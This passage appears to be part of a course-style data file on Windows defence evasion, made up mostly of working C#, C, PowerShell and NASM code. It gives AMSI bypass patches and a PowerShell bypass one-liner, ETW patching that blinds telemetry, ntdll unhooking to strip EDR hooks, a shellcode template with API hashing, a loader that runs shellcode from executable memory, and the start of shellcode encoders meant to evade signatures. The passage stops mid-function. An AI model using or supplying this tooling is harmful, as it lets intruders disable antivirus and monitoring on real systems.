            // Patch: mov eax, 0x80070057; ret (E_INVALIDARG)
            byte[] patch = {
                0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057
                0xC3                            // ret
            };
            
            Marshal.Copy(patch, 0, pAmsiOpenSession, patch.Length);
            
            VirtualProtect(pAmsiOpenSession,
                          (UIntPtr)3,
                          oldProtect,
                          out oldProtect);
            
            Console.WriteLine("[+] AmsiOpenSession patched!");
            return true;
        } catch {
            return false;
        }
    }
    
    // TECHNIQUE 3: Force AMSI context to fail
    [DllImport("amsi.dll")]
    public static extern int AmsiInitialize(
        string appName,
        out IntPtr amsiContext
    );
    
    [DllImport("amsi.dll")]
    public static extern void AmsiUninitialize(IntPtr amsiContext);
    
    public static bool ForceAMSIFailure() {
        try {
            IntPtr amsiContext;
            
            // Initialize AMSI
            int result = AmsiInitialize("MyApp", out amsiContext);
            
            if (result == 0 && amsiContext != IntPtr.Zero) {
                // Corrupt the context pointer
                uint oldProtect;
                VirtualProtect(amsiContext,
                              (UIntPtr)8,
                              PAGE_EXECUTE_READWRITE,
                              out oldProtect);
                
                // Zero out context
                Marshal.WriteInt64(amsiContext, 0);
                
                VirtualProtect(amsiContext,
                              (UIntPtr)8,
                              oldProtect,
                              out oldProtect);
                
                Console.WriteLine("[+] AMSI context corrupted!");
                return true;
            }
            
            return false;
        } catch {
            return false;
        }
    }
    
    // TECHNIQUE 4: PowerShell memory patch
    public static void PatchFromPowerShell() {
        /*
        PowerShell version:
        
        $a=[Ref].Assembly.GetTypes()
        ForEach($b in $a) {
            if ($b.Name -like "*iUtils") {
                $c=$b
            }
        }
        $d=$c.GetFields('NonPublic,Static')
        ForEach($e in $d) {
            if ($e.Name -like "*Context") {
                $f=$e
            }
        }
        $g=$f.GetValue($null)
        [IntPtr]$ptr=$g
        [Int32[]]$buf = @(0)
        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
        */
        
        Console.WriteLine(@"
PowerShell AMSI Bypass:
-----------------------
$a=[Ref].Assembly.GetTypes()
ForEach($b in $a) {
    if ($b.Name -like '*iUtils') { $c=$b }
}
$d=$c.GetFields('NonPublic,Static')
ForEach($e in $d) {
    if ($e.Name -like '*Context') { $f=$e }
}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
");
    }
}

class Program {
    static void Main() {
        Console.WriteLine("=== AMSI Bypass Techniques ===\\n");
        
        Console.WriteLine("WARNING: For educational purposes only!\\n");
        
        Console.WriteLine("[*] Attempting AMSI bypass...\\n");
        
        // Try different techniques
        if (AMSIBypass.PatchAmsiScanBuffer()) {
            Console.WriteLine("[+] Method 1: Success\\n");
        } else if (AMSIBypass.PatchAmsiOpenSession()) {
            Console.WriteLine("[+] Method 2: Success\\n");
        } else if (AMSIBypass.ForceAMSIFailure()) {
            Console.WriteLine("[+] Method 3: Success\\n");
        }
        
        // Test if bypass worked
        Console.WriteLine("[*] Testing AMSI bypass...");
        Console.WriteLine("[*] If next command doesn't trigger AMSI, bypass worked!");
        
        // This would normally trigger AMSI:
        // Invoke-Expression (New-Object Net.WebClient).DownloadString('...')
    }
}`,
          language: "csharp"
        },
        {
          title: "2. ETW Patching - Blinding Windows Telemetry",
          content: `ETW (Event Tracing for Windows) is Windows' logging system that records detailed telemetry. EDRs use ETW to monitor suspicious behavior. Patching ETW blinds these monitoring systems.

WHAT ETW LOGS:
• Process creation/termination
• Module loads (DLL injection)
• Thread creation
• Registry access
• File operations
• Network connections
• PowerShell execution

ETW PROVIDERS:
• Microsoft-Windows-DotNETRuntime
• Microsoft-Windows-PowerShell
• Microsoft-Windows-Kernel-Process
• And hundreds more...

THE PATCH:
Patch EtwEventWrite function in ntdll.dll to always return success without actually logging:
• Original: Full event writing code
• Patched: xor eax, eax; ret (instant return)

WHY IT WORKS:
Applications call EtwEventWrite to log events. If we make it return immediately, no events get logged but the application doesn't know (returns success).`,
          code: `using System;
using System.Runtime.InteropServices;

class ETWPatch {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName
    );
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
    
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    // TECHNIQUE 1: Patch EtwEventWrite
    public static bool PatchEtwEventWrite() {
        try {
            // Get ntdll.dll base
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] ntdll.dll not found");
                return false;
            }
            
            // Get EtwEventWrite address
            IntPtr pEtwEventWrite = GetProcAddress(
                hNtdll, "EtwEventWrite");
            
            if (pEtwEventWrite == IntPtr.Zero) {
                Console.WriteLine("[-] EtwEventWrite not found");
                return false;
            }
            
            Console.WriteLine($"[+] EtwEventWrite at: {pEtwEventWrite:X}");
            
            // Change protection
            uint oldProtect;
            if (!VirtualProtect(pEtwEventWrite,
                               (UIntPtr)3,
                               PAGE_EXECUTE_READWRITE,
                               out oldProtect)) {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }
            
            // Patch: ret (C3) - immediate return
            // Even simpler: just return success
            byte[] patch = {
                0x33, 0xC0,  // xor eax, eax (return 0 = success)
                0xC3         // ret
            };
            
            Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
            
            // Restore protection
            VirtualProtect(pEtwEventWrite,
                          (UIntPtr)3,
                          oldProtect,
                          out oldProtect);
            
            Console.WriteLine("[+] EtwEventWrite patched!");
            return true;
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
            return false;
        }
    }
    
    // TECHNIQUE 2: Patch specific ETW providers
    public static bool DisableCLRETW() {
        try {
            // Patch EtwEventRegister to prevent provider registration
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            IntPtr pEtwEventRegister = GetProcAddress(
                hNtdll, "EtwEventRegister");
            
            if (pEtwEventRegister == IntPtr.Zero) {
                return false;
            }
            
            Console.WriteLine($"[+] EtwEventRegister at: {pEtwEventRegister:X}");
            
            uint oldProtect;
            VirtualProtect(pEtwEventRegister,
                          (UIntPtr)3,
                          PAGE_EXECUTE_READWRITE,
                          out oldProtect);
            
            // Patch to return error
            byte[] patch = {
                0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 0x80070057 (E_INVALIDARG)
                0xC3                            // ret
            };
            
            Marshal.Copy(patch, 0, pEtwEventRegister, patch.Length);
            
            VirtualProtect(pEtwEventRegister,
                          (UIntPtr)3,
                          oldProtect,
                          out oldProtect);
            
            Console.WriteLine("[+] EtwEventRegister patched!");
            return true;
        } catch {
            return false;
        }
    }
    
    // TECHNIQUE 3: Patch EtwEventWriteFull
    public static bool PatchEtwEventWriteFull() {
        try {
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            IntPtr pEtwEventWriteFull = GetProcAddress(
                hNtdll, "EtwEventWriteFull");
            
            if (pEtwEventWriteFull == IntPtr.Zero) {
                Console.WriteLine("[-] EtwEventWriteFull not found");
                return false;
            }
            
            Console.WriteLine($"[+] EtwEventWriteFull at: {pEtwEventWriteFull:X}");
            
            uint oldProtect;
            VirtualProtect(pEtwEventWriteFull,
                          (UIntPtr)3,
                          PAGE_EXECUTE_READWRITE,
                          out oldProtect);
            
            byte[] patch = {
                0x33, 0xC0,  // xor eax, eax
                0xC3         // ret
            };
            
            Marshal.Copy(patch, 0, pEtwEventWriteFull, patch.Length);
            
            VirtualProtect(pEtwEventWriteFull,
                          (UIntPtr)3,
                          oldProtect,
                          out oldProtect);
            
            Console.WriteLine("[+] EtwEventWriteFull patched!");
            return true;
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
            return false;
        }
    }
    
    // Verify ETW is disabled
    public static void VerifyPatch() {
        Console.WriteLine("\\n[*] Verifying ETW patch...");
        
        // Try to trigger ETW events
        Console.WriteLine("[*] Attempting to trigger ETW events...");
        
        // Assembly load (would normally log to ETW)
        try {
            System.Reflection.Assembly.Load("System.Drawing");
            Console.WriteLine("[+] Assembly loaded (should not log to ETW)");
        } catch { }
        
        // PowerShell execution (would log)
        try {
            using (var ps = System.Management.Automation.PowerShell.Create()) {
                ps.AddScript("Write-Host 'Test'");
                ps.Invoke();
                Console.WriteLine("[+] PowerShell executed (should not log to ETW)");
            }
        } catch { }
        
        Console.WriteLine("[*] If no ETW events logged, patch successful!");
    }
}

class Program {
    static void Main() {
        Console.WriteLine("=== ETW Patching ===\\n");
        
        Console.WriteLine("WARNING: This disables Windows telemetry!");
        Console.WriteLine("For educational/research purposes only!\\n");
        
        Console.WriteLine("[*] Patching ETW functions...\\n");
        
        // Patch all ETW functions
        ETWPatch.PatchEtwEventWrite();
        ETWPatch.PatchEtwEventWriteFull();
        ETWPatch.DisableCLRETW();
        
        // Verify
        ETWPatch.VerifyPatch();
        
        Console.WriteLine("\\n[+] ETW telemetry disabled!");
        Console.WriteLine("[*] EDR/AV will have reduced visibility");
    }
}`,
          language: "csharp"
        },
        {
          title: "3. API Unhooking - Removing EDR Hooks",
          content: `EDRs hook Windows APIs to monitor behavior. Unhooking removes these hooks, restoring original API functionality and evading detection.

HOW EDR HOOKS WORK:
1. EDR loads into every process (DLL injection)
2. Patches API functions (usually first 5-12 bytes)
3. Redirects to EDR code: jmp [EDR_ADDRESS]
4. EDR logs behavior, then calls original function

HOOK DETECTION:
• Compare ntdll.dll in memory vs on disk
• First bytes should be normal function prologue
• If jmp/call instruction found → hooked!

UNHOOKING TECHNIQUES:
• Read clean ntdll.dll from disk, overwrite memory
• Use suspended process with clean ntdll
• Manually remap ntdll from \KnownDlls
• Parse PE and restore .text section

THE PROCESS:
1. Load ntdll.dll from disk (clean copy)
2. Parse PE headers
3. Find .text section (executable code)
4. Copy clean .text over hooked memory
5. All hooks removed!`,
          code: `using System;
using System.Runtime.InteropServices;
using System.IO;

class APIUnhook {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect
    );
    
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_READ = 0x20;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER {
        public ushort e_magic;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 29)]
        public ushort[] e_res;
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_NT_HEADERS {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_OPTIONAL_HEADER {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        // ... truncated for brevity
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_SECTION_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }
    
    // TECHNIQUE 1: Unhook ntdll.dll
    public static bool UnhookNtdll() {
        try {
            Console.WriteLine("[*] Unhooking ntdll.dll...");
            
            // Get ntdll base in memory (potentially hooked)
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) {
                Console.WriteLine("[-] Cannot get ntdll.dll");
                return false;
            }
            
            Console.WriteLine($"[+] ntdll.dll base: {hNtdll:X}");
            
            // Read clean ntdll from disk
            string ntdllPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                "ntdll.dll"
            );
            
            byte[] ntdllBytes = File.ReadAllBytes(ntdllPath);
            Console.WriteLine($"[+] Read {ntdllBytes.Length} bytes from disk");
            
            // Parse PE headers from disk
            GCHandle handle = GCHandle.Alloc(ntdllBytes, GCHandleType.Pinned);
            IntPtr pDiskNtdll = handle.AddrOfPinnedObject();
            
            IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(pDiskNtdll);
            IntPtr pNtHeaders = IntPtr.Add(pDiskNtdll, dosHeader.e_lfanew);
            IMAGE_NT_HEADERS ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(pNtHeaders);
            
            Console.WriteLine("[+] Parsed PE headers");
            
            // Find .text section
            IntPtr pSection = IntPtr.Add(pNtHeaders,
                Marshal.SizeOf(typeof(IMAGE_NT_HEADERS)));
            
            for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
                IMAGE_SECTION_HEADER section = 
                    Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(pSection);
                
                string sectionName = System.Text.Encoding.UTF8.GetString(
                    section.Name).TrimEnd('\\0');
                
                if (sectionName == ".text") {
                    Console.WriteLine($"[+] Found .text section");
                    Console.WriteLine($"    VA: 0x{section.VirtualAddress:X}");
                    Console.WriteLine($"    Size: 0x{section.VirtualSize:X}");
                    
                    // Calculate addresses
                    IntPtr pMemoryText = IntPtr.Add(hNtdll, (int)section.VirtualAddress);
                    IntPtr pDiskText = IntPtr.Add(pDiskNtdll, (int)section.PointerToRawData);
                    
                    // Change protection
                    uint oldProtect;
                    if (!VirtualProtect(pMemoryText,
                                       (UIntPtr)section.VirtualSize,
                                       PAGE_EXECUTE_READWRITE,
                                       out oldProtect)) {
                        Console.WriteLine("[-] VirtualProtect failed");
                        handle.Free();
                        return false;
                    }
                    
                    // Copy clean .text section
                    byte[] cleanText = new byte[section.VirtualSize];
                    Marshal.Copy(pDiskText, cleanText, 0, (int)section.VirtualSize);
                    Marshal.Copy(cleanText, 0, pMemoryText, (int)section.VirtualSize);
                    
                    Console.WriteLine("[+] Copied clean .text section");
                    
                    // Restore protection
                    VirtualProtect(pMemoryText,
                                  (UIntPtr)section.VirtualSize,
                                  PAGE_EXECUTE_READ,
                                  out oldProtect);
                    
                    Console.WriteLine("[+] ntdll.dll unhooked!");
                    
                    handle.Free();
                    return true;
                }
                
                pSection = IntPtr.Add(pSection,
                    Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            }
            
            handle.Free();
            Console.WriteLine("[-] .text section not found");
            return false;
        } catch (Exception ex) {
            Console.WriteLine($"[-] Error: {ex.Message}");
            return false;
        }
    }
    
    // TECHNIQUE 2: Check if function is hooked
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName
    );
    
    public static bool IsFunctionHooked(string dllName, string functionName) {
        IntPtr hModule = GetModuleHandle(dllName);
        if (hModule == IntPtr.Zero) return false;
        
        IntPtr pFunction = GetProcAddress(hModule, functionName);
        if (pFunction == IntPtr.Zero) return false;
        
        // Read first bytes
        byte[] bytes = new byte[5];
        Marshal.Copy(pFunction, bytes, 0, 5);
        
        // Check for common hook patterns
        // E9 = jmp rel32 (most common hook)
        if (bytes[0] == 0xE9) {
            Console.WriteLine($"[!] {functionName} is HOOKED (jmp)");
            return true;
        }
        
        // FF 25 = jmp [rip+offset]
        if (bytes[0] == 0xFF && bytes[1] == 0x25) {
            Console.WriteLine($"[!] {functionName} is HOOKED (indirect jmp)");
            return true;
        }
        
        // Expected pattern for normal ntdll function (x64)
        // 4C 8B D1 B8 = mov r10, rcx; mov eax, SSN
        if (bytes[0] == 0x4C && bytes[1] == 0x8B) {
            Console.WriteLine($"[+] {functionName} is clean");
            return false;
        }
        
        Console.WriteLine($"[?] {functionName} has unknown pattern");
        return true;  // Assume hooked if unknown
    }
    
    // Scan for hooks
    public static void ScanForHooks() {
        Console.WriteLine("\\n=== Scanning for API hooks ===\\n");
        
        string[] functions = {
            "NtOpenProcess",
            "NtReadVirtualMemory",
            "NtWriteVirtualMemory",
            "NtAllocateVirtualMemory",
            "NtProtectVirtualMemory",
            "NtCreateThread",
            "NtQueueApcThread",
            "NtOpenFile",
            "NtCreateFile"
        };
        
        foreach (string func in functions) {
            IsFunctionHooked("ntdll.dll", func);
        }
    }
}

class Program {
    static void Main() {
        Console.WriteLine("=== API Unhooking ===\\n");
        
        // Scan before unhooking
        APIUnhook.ScanForHooks();
        
        // Unhook
        Console.WriteLine("\\n[*] Attempting to unhook ntdll.dll...\\n");
        if (APIUnhook.UnhookNtdll()) {
            Console.WriteLine("\\n[+] Success!");
            
            // Scan after unhooking
            APIUnhook.ScanForHooks();
        } else {
            Console.WriteLine("\\n[-] Unhooking failed");
        }
    }
}`,
          language: "csharp"
        }
      ]
    },
    shellcode: {
      title: "Shellcode Development",
      sections: [
        {
          title: "1. x64 Assembly Fundamentals - Writing Shellcode",
          content: `Shellcode is position-independent code (PIC) that runs without relying on fixed memory addresses. It's used in exploits, loaders, and evasion.

WHY ASSEMBLY:
• Complete control over generated code
• No C runtime dependencies
• Tiny size (important for exploits)
• Can do things C can't easily do

X64 CALLING CONVENTION (Windows):
• First 4 params: RCX, RDX, R8, R9
• Additional params on stack
• Return value in RAX
• Caller must allocate 32 bytes shadow space on stack
• Volatile registers: RAX, RCX, RDX, R8-R11
• Non-volatile: RBX, RBP, RDI, RSI, R12-R15

COMMON INSTRUCTIONS:
• mov: Move data
• lea: Load effective address
• push/pop: Stack operations
• call/ret: Function calls
• jmp/je/jne: Jumps
• xor: XOR (xor rax, rax = zero RAX)
• add/sub: Arithmetic

POSITION-INDEPENDENT CODE:
• No hardcoded addresses
• Use RIP-relative addressing
• Calculate addresses at runtime
• Find kernel32.dll dynamically`,
          code: `; x64 Shellcode Template (NASM syntax)
; Compiles to pure position-independent code

BITS 64
DEFAULT REL

; Entry point
global start

section .text

start:
    ; Save registers (non-volatile)
    push rbx
    push rdi
    push rsi
    push r12
    push r13
    push r14
    push r15
    
    ; Your shellcode here
    call main
    
    ; Restore registers
    pop r15
    pop r14
    pop r13
    pop r12
    pop rsi
    pop rdi
    pop rbx
    
    ret

main:
    ; STEP 1: Find kernel32.dll base
    ; Use PEB (Process Environment Block)
    xor rcx, rcx              ; RCX = 0
    mov rax, gs:[0x60]        ; RAX = PEB
    mov rax, [rax + 0x18]     ; RAX = PEB->Ldr
    mov rax, [rax + 0x20]     ; RAX = Ldr->InMemoryOrderModuleList
    mov rax, [rax]            ; First entry (ntdll)
    mov rax, [rax]            ; Second entry (kernel32)
    mov r12, [rax + 0x20]     ; R12 = kernel32 base
    
    ; R12 now contains kernel32.dll base address!
    
    ; STEP 2: Find function by hash
    ; We'll calculate hash of function name
    mov rcx, r12              ; kernel32 base
    mov edx, 0xEC0E4E8E       ; Hash of "LoadLibraryA"
    call FindFunctionByHash
    mov r13, rax              ; R13 = LoadLibraryA
    
    ; STEP 3: Load library
    lea rcx, [rel str_user32] ; Param 1: "user32.dll"
    sub rsp, 0x20             ; Shadow space
    call r13                  ; Call LoadLibraryA
    add rsp, 0x20             ; Clean shadow space
    mov r14, rax              ; R14 = user32.dll base
    
    ; STEP 4: Find MessageBoxA
    mov rcx, r14              ; user32 base
    mov edx, 0x384EE0D4       ; Hash of "MessageBoxA"
    call FindFunctionByHash
    mov r15, rax              ; R15 = MessageBoxA
    
    ; STEP 5: Call MessageBoxA
    xor rcx, rcx              ; hWnd = NULL
    lea rdx, [rel str_msg]    ; lpText
    lea r8, [rel str_title]   ; lpCaption
    xor r9, r9                ; uType = MB_OK
    sub rsp, 0x20             ; Shadow space
    call r15                  ; Call MessageBoxA
    add rsp, 0x20
    
    ret

; Find function by hash (API hashing)
FindFunctionByHash:
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi
    
    mov rsi, rcx              ; Module base
    mov edi, edx              ; Target hash
    
    ; Parse PE headers
    mov eax, [rsi + 0x3C]     ; e_lfanew
    add rax, rsi              ; NT headers
    mov eax, [rax + 0x88]     ; Export directory RVA
    add rax, rsi              ; Export directory
    
    ; Get export arrays
    mov ecx, [rax + 0x18]     ; NumberOfNames
    mov ebx, [rax + 0x20]     ; AddressOfNames
    add rbx, rsi
    
.loop:
    dec ecx
    mov edx, [rbx + rcx*4]    ; Name RVA
    add rdx, rsi              ; Name pointer
    
    ; Calculate hash of name
    call HashString
    
    cmp eax, edi              ; Compare with target
    jnz .loop
    
    ; Found! Get function address
    mov ebx, [rax + 0x24]     ; AddressOfNameOrdinals
    add rbx, rsi
    movzx ecx, word [rbx + rcx*2]  ; Ordinal
    
    mov ebx, [rax + 0x1C]     ; AddressOfFunctions
    add rbx, rsi
    mov eax, [rbx + rcx*4]    ; Function RVA
    add rax, rsi              ; Function address
    
    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; Hash string (simple algorithm)
HashString:
    xor eax, eax              ; Hash = 0
    xor rbx, rbx              ; Counter
    
.hash_loop:
    mov bl, byte [rdx]        ; Get character
    test bl, bl               ; Check for null
    jz .hash_done
    
    ror eax, 13               ; Rotate hash
    add eax, ebx              ; Add character
    inc rdx
    jmp .hash_loop
    
.hash_done:
    ret

section .data
    str_user32 db "user32.dll", 0
    str_msg db "Shellcode executed!", 0
    str_title db "Success", 0

; Compile with:
; nasm -f win64 shellcode.asm -o shellcode.obj
; link /entry:start shellcode.obj /subsystem:console

; Extract raw shellcode:
; objcopy -O binary shellcode.exe shellcode.bin

/*
C++ Loader for shellcode:
*/

#include <windows.h>
#include <stdio.h>

int main() {
    // Your shellcode bytes here
    unsigned char shellcode[] = {
        0x55, 0x48, 0x89, 0xE5,  // ...
        // (extracted from shellcode.bin)
    };
    
    // Allocate executable memory
    LPVOID pShellcode = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // Copy shellcode
    memcpy(pShellcode, shellcode, sizeof(shellcode));
    
    printf("[+] Shellcode at: %p\\n", pShellcode);
    printf("[*] Executing...\\n");
    
    // Execute
    ((void(*)())pShellcode)();
    
    // Cleanup
    VirtualFree(pShellcode, 0, MEM_RELEASE);
    
    return 0;
}`,
          language: "nasm"
        },
        {
          title: "2. API Hashing - Hiding Function Names",
          content: `API hashing conceals which functions your shellcode uses by replacing function names with their hash values. This evades signature detection and makes reverse engineering harder.

WHY HASH:
• Function strings not in shellcode (no "VirtualAlloc", "CreateProcess")
• Evades string-based signatures
• Smaller shellcode size
• Dynamic API resolution

HOW IT WORKS:
1. Calculate hash of each API name at build time
2. Store only hash in shellcode
3. At runtime, enumerate exports
4. Hash each export name
5. Compare with target hash
6. When match found, use that function

HASH ALGORITHMS:
• Simple: ROR13 (rotate right 13, add char)
• CRC32: Common checksum
• Custom: Make your own

EXAMPLE:
LoadLibraryA → Hash → 0xEC0E4E8E
At runtime: Find function with hash 0xEC0E4E8E`,
          code: `#include <windows.h>
#include <stdio.h>

// Simple ROR13 hash algorithm
DWORD HashString(const char* str) {
    DWORD hash = 0;
    
    while (*str) {
        hash = (hash >> 13) | (hash << (32 - 13));  // ROR 13
        hash += (DWORD)(*str);
        str++;
    }
    
    return hash;
}

// Calculate hashes for common APIs
void GenerateHashes() {
    const char* apis[] = {
        "LoadLibraryA",
        "GetProcAddress",
        "VirtualAlloc",
        "VirtualProtect",
        "CreateThread",
        "WaitForSingleObject",
        "MessageBoxA",
        "ExitProcess"
    };
    
    printf("API Hashes (ROR13):\\n");
    printf("==================\\n\\n");
    
    for (int i = 0; i < sizeof(apis)/sizeof(apis[0]); i++) {
        DWORD hash = HashString(apis[i]);
        printf("%-25s = 0x%08X\\n", apis[i], hash);
    }
}

// Find export by hash
PVOID FindExportByHash(HMODULE hModule, DWORD targetHash) {
    // Get DOS header
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    
    // Get NT headers
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)
        ((BYTE*)hModule + pDos->e_lfanew);
    
    // Get export directory
    DWORD exportRVA = pNt->OptionalHeader.DataDirectory[0].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)
        ((BYTE*)hModule + exportRVA);
    
    // Get export arrays
    DWORD* pNames = (DWORD*)((BYTE*)hModule + pExport->AddressOfNames);
    DWORD* pFunctions = (DWORD*)((BYTE*)hModule + pExport->AddressOfFunctions);
    WORD* pOrdinals = (WORD*)((BYTE*)hModule + pExport->AddressOfNameOrdinals);
    
    // Search for hash
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* szName = (char*)((BYTE*)hModule + pNames[i]);
        DWORD hash = HashString(szName);
        
        if (hash == targetHash) {
            // Found!
            WORD ordinal = pOrdinals[i];
            DWORD funcRVA = pFunctions[ordinal];
            
            printf("[+] Found: %s (hash 0x%08X) at offset 0x%08X\\n",
                   szName, hash, funcRVA);
            
            return (PVOID)((BYTE*)hModule + funcRVA);
        }
    }
    
    return NULL;
}

// Example: Use hashed APIs
void HashingExample() {
    // Get kernel32.dll
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    
    // Find LoadLibraryA by hash
    typedef HMODULE (WINAPI* LoadLibraryA_t)(LPCSTR);
    LoadLibraryA_t pLoadLibraryA = (LoadLibraryA_t)FindExportByHash(
        hKernel32,
        0xEC0E4E8E  // Hash of "LoadLibraryA"
    );
    
    if (pLoadLibraryA) {
        printf("[+] LoadLibraryA at: %p\\n", pLoadLibraryA);
        
        // Use it to load user32.dll
        HMODULE hUser32 = pLoadLibraryA("user32.dll");
        printf("[+] Loaded user32.dll: %p\\n", hUser32);
        
        // Find MessageBoxA by hash
        typedef int (WINAPI* MessageBoxA_t)(HWND, LPCSTR, LPCSTR, UINT);
        MessageBoxA_t pMessageBoxA = (MessageBoxA_t)FindExportByHash(
            hUser32,
            0x384EE0D4  // Hash of "MessageBoxA"
        );
        
        if (pMessageBoxA) {
            printf("[+] MessageBoxA at: %p\\n", pMessageBoxA);
            
            // Call it
            pMessageBoxA(NULL,
                        "Found via API hashing!",
                        "Success",
                        MB_OK);
        }
    }
}

// Generate shellcode with hashed APIs
void GenerateHashedShellcode() {
    printf("\\nShellcode Template with API Hashing:\\n");
    printf("====================================\\n\\n");
    
    printf("BITS 64\\n");
    printf("DEFAULT REL\\n\\n");
    
    printf("; API Hashes\\n");
    printf("HASH_LoadLibraryA    equ 0xEC0E4E8E\\n");
    printf("HASH_GetProcAddress  equ 0x7C0DFCAA\\n");
    printf("HASH_VirtualAlloc    equ 0x91AFCA54\\n");
    printf("HASH_MessageBoxA     equ 0x384EE0D4\\n\\n");
    
    printf("; Find API by hash\\n");
    printf("mov rcx, r12          ; kernel32 base\\n");
    printf("mov edx, HASH_LoadLibraryA\\n");
    printf("call FindExportByHash\\n");
    printf("mov r13, rax          ; Save LoadLibraryA\\n\\n");
    
    printf("; Use LoadLibraryA\\n");
    printf("lea rcx, [rel str_user32]\\n");
    printf("sub rsp, 0x20\\n");
    printf("call r13\\n");
    printf("add rsp, 0x20\\n");
}

int main() {
    printf("=== API Hashing ===\\n\\n");
    
    // Generate hash table
    GenerateHashes();
    
    // Test hashing
    printf("\\n=== Testing API Resolution ===\\n\\n");
    HashingExample();
    
    // Generate template
    printf("\\n");
    GenerateHashedShellcode();
    
    return 0;
}`,
          language: "c"
        },
        {
          title: "3. Shellcode Encoders & Encryption - Evading Signatures",
          content: `Raw shellcode often contains bad characters (null bytes) or gets detected by AV signatures. Encoding/encrypting shellcode solves both problems.

WHY ENCODE:
• Remove bad characters (\\x00, \\x0A, \\x0D)
• Evade signature detection
• Polymorphic - different each time
• Smaller size (compression)

ENCODING TECHNIQUES:
• XOR: Simple, fast, reversible
• Base64: Text-safe, no bad chars
• Custom substitution cipher
• Compression (RLE, LZMA)

ENCRYPTION TECHNIQUES:
• AES: Strong, standard
• RC4: Simple stream cipher
• ChaCha20: Modern, fast
• Custom algorithms

THE PATTERN:
[Decoder Stub] + [Encoded Shellcode]
1. Decoder stub runs first (must be clean)
2. Decodes/decrypts shellcode in memory
3. Jumps to decoded shellcode
4. Original shellcode executes

POLYMORPHISM:
Change encoding each time = different signature each time!`,
          code: `#include <windows.h>
#include <stdio.h>

// ENCODER 1: Simple XOR encoder
void XorEncode(BYTE* data, DWORD dataLen, BYTE key) {
    for (DWORD i = 0; i < dataLen; i++) {
        data[i] ^= key;
    }
}

void GenerateXorEncoder() {
    // Example shellcode (just 'ret' instruction repeated)
    BYTE shellcode[] = { 0xC3, 0xC3, 0xC3, 0xC3 };
    DWORD shellcodeLen = sizeof(shellcode);
    BYTE key = 0xAA;
    
    printf("=== XOR Encoder ===\\n\\n");
    printf("Original shellcode: ");
    for (DWORD i = 0; i < shellcodeLen; i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("\\n");
    
    // Encode
    XorEncode(shellcode, shellcodeLen, key);
    
    printf("Encoded shellcode:  ");
